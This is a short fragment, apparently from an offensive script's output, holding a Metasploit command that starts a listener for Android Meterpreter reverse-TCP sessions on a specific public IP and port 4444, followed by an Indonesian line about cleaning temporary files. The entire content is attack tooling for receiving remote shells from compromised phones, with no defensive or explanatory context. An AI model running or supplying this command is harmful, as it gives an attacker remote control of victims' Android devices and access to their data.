msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 8.215.192.205; set LPORT 4444; set ExitOnSession false; run'
[*] Membersihkan temporary files...
